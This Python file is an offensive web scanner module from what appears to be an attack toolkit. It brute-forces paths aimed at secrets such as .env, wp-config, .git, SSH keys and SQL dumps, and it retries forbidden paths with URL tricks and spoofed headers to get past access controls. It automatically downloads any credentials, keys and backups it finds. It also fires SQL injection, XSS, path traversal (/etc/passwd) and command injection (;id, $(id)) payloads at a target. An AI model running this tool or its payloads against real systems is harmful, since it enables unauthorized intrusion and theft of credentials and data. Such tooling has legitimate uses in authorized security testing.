"""
HTTP Scanner — advanced directory discovery + bypass + exploit probes.

Modules:
  - dirbust  : wordlist-based discovery, extension fuzzing, recursion,
               robots.txt, source-control dirs, backup file hunting,
               bypass attempts, header manipulation, auto-download
  - sqli     : error-based injection probe
  - xss      : reflected XSS probe
  - lfi      : local file inclusion probe
  - cmdi     : command injection probe

All downloaded artifacts go to downloads/<host>/<subdir>/.
"""
import http.client
import ssl
from urllib.parse import urlencode, urlparse, quote_plus

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig
from modules.downloads import save_bytes, save_text, save_discovered


# ---------- wordlists ----------

DIR_PATHS = [
    # admin panels
    "admin", "admin/", "admin.php", "admin/login", "admin/index.php",
    "administrator", "administrator/", "login", "login/", "login.php",
    "signin", "signin/", "wp-admin/", "wp-login.php", "phpmyadmin/",
    "phpmyadmin/index.php", "pma/", "myadmin/", "adminer.php",
    "console/", "manager/html", "cpanel", "webmail",
    # backups / archives
    "backup", "backup/", "backups/", "backup.zip", "backup.tar.gz",
    "backup.sql", "db.sql", "db_backup.sql", "site.zip", "site.tar.gz",
    "www.zip", "web.zip", "html.zip", "public_html.zip", "dump.sql",
    "data.zip", "export.sql", "old/", "old.zip", "www.tar.gz",
    # config / secrets
    ".env", ".env.bak", ".env.old", "config.php", "config.php.bak",
    "config.php.old", "config.inc.php", "configuration.php",
    "wp-config.php", "wp-config.php.bak", "wp-config.php.old",
    "settings.py", "settings.php", "config.yml", "config.yaml",
    "config.json", ".htaccess", ".htpasswd", "web.config",
    "php.ini", ".user.ini", "secrets.json", "credentials.json",
    # source control
    ".git/HEAD", ".git/config", ".git/COMMIT_EDITMSG", ".git/index",
    ".svn/entries", ".svn/wc.db", ".hg/hgrc", ".hg/requires",
    ".DS_Store",
    # logs
    "error.log", "access.log", "debug.log", "app.log", "app.log.bak",
    "logs/", "log/", "log.txt", "error_log",
    # default installs
    "readme.html", "readme.txt", "README.md", "CHANGELOG.md",
    "LICENSE", "license.txt", "install/", "install.php", "setup.php",
    "upgrade.php", "installer/",
    # APIs / debug
    "api/", "api/v1/", "api/v2/", "api/docs", "swagger/", "swagger.json",
    "swagger-ui/", "openapi.json", "graphql", "graphiql",
    "debug", "debug/", "test.php", "test/", "dev/", "staging/",
    "health", "healthz", "status", "metrics", "server-status",
    "server-info", "actuator", "actuator/env", "actuator/health",
    # uploads / storage
    "uploads/", "upload/", "files/", "file/", "images/", "img/",
    "static/", "assets/", "media/", "tmp/", "temp/", "cache/",
    # common files
    "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt",
    ".well-known/security.txt", "humans.txt",
    # CMS paths
    "wp-content/", "wp-content/uploads/", "wp-includes/",
    "wp-json/", "wp-json/wp/v2/users", "sites/default/settings.php",
    "sites/default/files/", "core/", "modules/", "themes/",
    "includes/", "includes/config.php",
    # misc
    "adminer", "adminer.php", "info.php", "phpinfo.php", "test/",
    "cgi-bin/", "cgi-bin/test.cgi", "shell.php", "cmd.php",
]

BACKUP_EXTENSIONS = [
    ".bak", ".old", ".orig", ".backup", ".save", ".swp", ".swo",
    ".tmp", ".temp", "~", ".1", ".2", ".copy", ".disabled",
]

DOWNLOAD_EXTENSIONS = {
    ".zip", ".tar", ".gz", ".tgz", ".rar", ".7z", ".tar.gz",
    ".sql", ".db", ".sqlite", ".dump",
    ".env", ".ini", ".yml", ".yaml", ".json", ".xml", ".conf", ".cfg",
    ".bak", ".old", ".backup", ".log",
}

DOWNLOAD_PATH_HINTS = (
    ".env", ".git/", ".svn/", "wp-config", "config.", "settings.",
    "backup", "dump", ".sql", ".zip", ".tar", ".gz", "robots.txt",
    "sitemap.xml", ".htpasswd", "credentials", "secrets",
    "id_rsa", "id_dsa", ".pem", ".key",
)


# ---------- bypass / case / path variants ----------

def _bypass_variants(path: str) -> list[str]:
    """Return path variants that often bypass WAF / routing rules."""
    clean = path.lstrip("/")
    return [
        "/" + clean,
        "//" + clean,
        "/./" + clean,
        "/" + clean + "/",
        "/" + clean + "/.",
        "/" + clean + "/..;/",
        "/" + clean + "%20",
        "/" + clean + "%00",
        "/" + clean + "?", 
        "/" + clean + "%2e",
        "/" + clean + "/;",
        "/" + clean.upper(),
        "/%2e/" + clean,
        "/..%2f" + clean,
    ]


def _bypass_headers() -> list[dict]:
    base = {"User-Agent": "Mozilla/5.0 (compatible; SecurityAudit)"}
    return [
        base,
        {**base, "X-Forwarded-For": "127.0.0.1"},
        {**base, "X-Forwarded-Host": "127.0.0.1"},
        {**base, "X-Original-URL": "/admin"},
        {**base, "X-Rewrite-URL": "/admin"},
        {**base, "X-Custom-IP-Authorization": "127.0.0.1"},
        {**base, "X-Originating-IP": "127.0.0.1"},
        {**base, "Referer": "http://127.0.0.1/"},
        {**base, "X-Forwarded-For": "127.0.0.1", "X-Forwarded-Proto": "https"},
    ]


# ---------- HTTP helpers ----------

def _conn(host, port, tls, timeout=3.5):
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    return http.client.HTTPConnection(host, port, timeout=timeout)


def _request(host, port, tls, path, method="GET", headers=None, body=None, timeout=3.5):
    try:
        c = _conn(host, port, tls, timeout=timeout)
        c.request(method, path, headers=headers or {"User-Agent": "Mozilla/5.0"})
        r = c.getresponse()
        data = r.read(16384)
        result = {
            "status": r.status,
            "headers": dict(r.getheaders()),
            "body": data,
            "size": len(data),
            "reason": r.reason,
        }
        c.close()
        return result
    except Exception:
        return None


def _should_download(path: str, resp: dict) -> bool:
    if not resp or resp["status"] not in (200, 206):
        return False
    p_lower = path.lower().split("?")[0]
    for ext in DOWNLOAD_EXTENSIONS:
        if p_lower.endswith(ext):
            return True
    for hint in DOWNLOAD_PATH_HINTS:
        if hint in p_lower:
            return True
    ctype = resp["headers"].get("Content-Type", "").lower()
    if any(k in ctype for k in (
        "application/octet-stream", "application/zip",
        "application/x-tar", "application/gzip",
        "text/plain", "application/json", "application/xml",
    )) and resp["size"] < 50 * 1024 * 1024:      # 50 MB cap
        return True
    return False


def _auto_download(host, subdir, path, resp):
    if not _should_download(path, resp):
        return
    name = path.strip("/").replace("/", "_") or "index"
    if "?" in name:
        name = name.split("?")[0]
    save_bytes(resp["body"], name, host=host, subdir=subdir)


# ---------- attack modules ----------

SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "') OR ('1'='1", "' OR 1=1--", "\" OR 1=1--"]
XSS_PAYLOADS  = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
                 "javascript:alert(1)", "'><svg/onload=alert(1)>"]
LFI_PAYLOADS  = ["../../../../etc/passwd", "....//....//etc/passwd",
                 "/etc/passwd%00", "..\\..\\..\\windows\\win.ini",
                 "/etc/passwd"]
CMDI_PAYLOADS = [";id", "|id", "`id`", "$(id)", "&&id", "||id"]


def _scan_param(host, port, tls, path, param, payload):
    sep = "&" if "?" in path else "?"
    url = f"{path}{sep}{param}={quote_plus(payload)}"
    return _request(host, port, tls, url)


def _report(kind, path, param, payload, evidence):
    console.print(
        f"\n[bold warning]⚠ {kind}[/bold warning]\n"
        f"  [muted]URL     :[/muted] [text]{path}?{param}={payload}[/text]\n"
        f"  [muted]Evidence:[/muted] [text]{evidence[:120]}[/text]"
    )


def _sqli(host, port, tls, path, params, log_handle):
    for p in params:
        for pl in SQLI_PAYLOADS:
            resp = _scan_param(host, port, tls, path, p, pl)
            if not resp:
                continue
            low = resp["body"].decode("utf-8", "replace").lower()
            if any(k in low for k in (
                "sql syntax", "mysql_fetch", "sqlstate", "ora-", "syntax error",
                "unclosed quotation", "you have an error in your sql",
                "postgresql", "sqlite", "warning: mysql",
            )):
                _report("SQLi", path, p, pl, low)
                if log_handle:
                    log_handle.write(f"[SQLI] {path}?{p}={pl}\n")
                break


def _xss(host, port, tls, path, params, log_handle):
    for p in params:
        for pl in XSS_PAYLOADS:
            resp = _scan_param(host, port, tls, path, p, pl)
            if resp and pl in resp["body"].decode("utf-8", "replace"):
                _report("XSS (reflected)", path, p, pl, pl)
                if log_handle:
                    log_handle.write(f"[XSS] {path}?{p}={pl}\n")
                break


def _lfi(host, port, tls, path, params, log_handle):
    for p in params:
        for pl in LFI_PAYLOADS:
            resp = _scan_param(host, port, tls, path, p, pl)
            if not resp:
                continue
            text = resp["body"].decode("utf-8", "replace")
            if "root:x:0:0" in text or "root:*:" in text or "[extensions]" in text:
                _report("LFI", path, p, pl, text)
                if log_handle:
                    log_handle.write(f"[LFI] {path}?{p}={pl}\n")
                break


def _cmdi(host, port, tls, path, params, log_handle):
    import re
    for p in params:
        for pl in CMDI_PAYLOADS:
            resp = _scan_param(host, port, tls, path, p, pl)
            if not resp:
                continue
            text = resp["body"].decode("utf-8", "replace")
            if re.search(r"uid=\d+\([^\)]+\)\s+gid=\d+\(", text):
                _report("Command Injection", path, p, pl, text)
                if log_handle:
                    log_handle.write(f"[CMDI] {path}?{p}={pl}\n")
                break


# ---------- advanced directory brute ----------

def _parse_robots(host, port, tls, base):
    """Read robots.txt and yield Disallow paths."""
    path = base.rstrip("/") + "/robots.txt"
    resp = _request(host, port, tls, path)
    if not resp or resp["status"] != 200:
        return []
    try:
        text = resp["body"].decode("utf-8", "replace")
    except Exception:
        return []
    out = []
    for line in text.splitlines():
        line = line.strip()
        if line.lower().startswith("disallow:"):
            p = line.split(":", 1)[1].strip()
            if p and p != "/":
                out.append(p.lstrip("/"))
    if out:
        console.print(f"  [muted]robots.txt revealed {len(out)} path(s)[/muted]")
        save_text(text, "robots.txt", host=host, subdir="discovered")
    return out


def _try_path(host, port, tls, base, relpath, log_handle, host_label):
    """Probe one path. Fast baseline first, only attempts bypass on 401/403."""
    full_path = base.rstrip("/") + "/" + relpath.lstrip("/")

    # 1. Fast baseline request
    resp = _request(host, port, tls, full_path, timeout=3.5)
    if not resp:
        return False

    st = resp["status"]
    if st in (200, 201, 204, 206, 301, 302):
        loc = f" → {resp['headers'].get('Location', '')}" if resp.get('headers', {}).get('Location') else ""
        console.print(
            f"  [bold success]✓ {st:>3}[/bold success]  "
            f"[text]{full_path}[/text]  "
            f"[muted]({resp['size']}b){loc}[/muted]"
        )
        if log_handle:
            log_handle.write(f"[DIR] {st} {full_path} {resp['size']}b\n")
        _auto_download(host_label, "dirbust", full_path, resp)
        return True

    elif st in (401, 403):
        console.print(
            f"  [bold yellow]! {st:>3}[/bold yellow]  "
            f"[text]{full_path}[/text]  "
            f"[dim](gated — testing top bypasses...)[/dim]"
        )
        if log_handle:
            log_handle.write(f"[DIR] {st} {full_path} (protected)\n")

        # Targeted bypasses only on actual protected endpoints
        clean = relpath.lstrip("/")
        quick_variants = [f"//{clean}", f"/{clean}/.", f"/%2e/{clean}"]
        quick_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": full_path},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ]
        for v in quick_variants:
            for h in quick_headers:
                b_resp = _request(host, port, tls, v, headers=h, timeout=3.0)
                if b_resp and b_resp["status"] in (200, 206):
                    console.print(
                        f"  [bold success]✓ BYPASS {b_resp['status']}[/bold success]  "
                        f"[text]{v}[/text]  "
                        f"[muted]({b_resp['size']}b)[/muted]"
                    )
                    if log_handle:
                        log_handle.write(f"[DIR_BYPASS] {b_resp['status']} {v}\n")
                    _auto_download(host_label, "dirbust", v, b_resp)
                    return True
        return True

    return False


def _dirbust(host, port, tls, base, log_handle, host_label, depth=1):
    console.print(f"\n[bold secondary]▸ Directory Brute (fast & active)[/bold secondary]")
    console.print(
        f"  [muted]Base path :[/muted] [text]{base}[/text]\n"
        f"  [muted]Wordlist  :[/muted] [text]{len(DIR_PATHS)} core paths[/text]\n"
        f"  [muted]Timeout   :[/muted] [text]3.5s per probe (no hanging)[/text]\n"
    )

    # 1. robots.txt
    robots_paths = _parse_robots(host, port, tls, base)
    all_paths = list(DIR_PATHS) + robots_paths

    found_dirs = []
    total = len(all_paths)
    for i, rel in enumerate(all_paths, 1):
        if i % 10 == 0 or i == 1:
            console.print(f"  [dim]... probing [{i}/{total}] {rel[:40]}[/dim]")
        ok = _try_path(host, port, tls, base, rel, log_handle, host_label)
        if ok and rel.endswith("/"):
            found_dirs.append(rel)

    # 2. Recursion on top discovered directories only
    if depth > 0 and found_dirs:
        console.print(f"\n[bold secondary]▸ Recursing into {len(found_dirs[:3])} discovered dir(s)[/bold secondary]")
        for d in found_dirs[:3]:   # cap to top 3 to avoid infinite loops
            sub_base = base.rstrip("/") + "/" + d.lstrip("/")
            _dirbust(host, port, tls, sub_base, log_handle, host_label, depth=depth - 1)


# ---------- entry point ----------

def run(target: TargetInfo, config: AttackConfig) -> None:
    console.print(
        f"\n[bold primary][ HTTP SCANNER ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [muted]Path   :[/muted] [text]{config.http_path}[/text]\n"
        f"  [muted]Params :[/muted] [text]{config.http_params}[/text]\n"
        f"  [muted]Modules:[/muted] [text]{', '.join(config.http_scan_types)}[/text]\n"
    )

    params = [x.strip() for x in config.http_params.split(",") if x.strip()]
    log_handle = None
    if config.log_file:
        try:
            log_handle = open(config.log_file, "a", encoding="utf-8")
        except OSError:
            log_handle = None

    try:
        for mod in config.http_scan_types:
            if mod == "dirbust":
                _dirbust(
                    target.host, target.port, config.http_use_tls,
                    config.http_path, log_handle, target.host,
                    depth=1,
                )
            elif mod == "sqli":
                console.print("\n[bold secondary]▸ SQL Injection[/bold secondary]")
                _sqli(target.host, target.port, config.http_use_tls,
                      config.http_path, params, log_handle)
            elif mod == "xss":
                console.print("\n[bold secondary]▸ Reflected XSS[/bold secondary]")
                _xss(target.host, target.port, config.http_use_tls,
                     config.http_path, params, log_handle)
            elif mod == "lfi":
                console.print("\n[bold secondary]▸ Local File Inclusion[/bold secondary]")
                _lfi(target.host, target.port, config.http_use_tls,
                     config.http_path, params, log_handle)
            elif mod == "cmdi":
                console.print("\n[bold secondary]▸ Command Injection[/bold secondary]")
                _cmdi(target.host, target.port, config.http_use_tls,
                      config.http_path, params, log_handle)
    finally:
        if log_handle:
            log_handle.close()